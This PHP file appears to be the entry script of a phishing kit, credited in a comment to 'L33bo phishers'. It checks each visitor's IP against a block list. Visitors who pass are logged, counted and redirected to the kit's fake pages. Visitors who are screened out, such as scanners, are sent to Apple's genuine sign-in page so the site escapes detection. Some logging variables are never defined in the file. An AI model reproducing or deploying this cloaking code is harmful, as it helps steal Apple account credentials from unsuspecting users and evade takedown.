<?php
/*
||| L33bo phishers = ICQ: 695059760
*/
@require_once("ip_list_check.php");
@require_once("bocah/includes/functions.php");

$ips = array(	$_SERVER['REMOTE_ADDR'], );
$checklist = new IpBlockList( );
foreach ($ips as $ip ) {
	$result = $checklist->ipPass( $ip );
	if ( $result ) {
		$msg = "PASSED: ".$checklist->message();
        $fp = fopen("bocah/logs/visitor_logged_in.txt", "a");
        fputs($fp, "IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\r\n");
        fclose($fp);		
		session_start();
        $_SESSION['page_a_visited'] = true;
		redirectTo("https://$_SERVER[SERVER_NAME]/Pages?ref=checks&protocol=ssl&sessionsid=" . generateRandomString(86));
		$file = $_SERVER['DOCUMENT_ROOT']."/bocah/logs/._hitz_.txt";
        $isi  = @file_get_contents($file);
        $buka = @fopen($file,"w"); 
        
	    @fwrite($buka, $isi+1);
	    @fclose($buka);
	}
	else {
		$msg = "FAILED: ".$checklist->message();
		$fp = fopen("bocah/logs/denied_visitors.txt", "a");
        fputs($fp, "IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\r\n");
        fclose($fp);
        header("Location: https://idmsa.apple.com/IDMSWebAuth/login.html?appIdKey=af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3&accNameLocked=false&language=US-EN&path=/signin/?referrer=/account/manage&Env=PROD");
		die();
	}
}
?>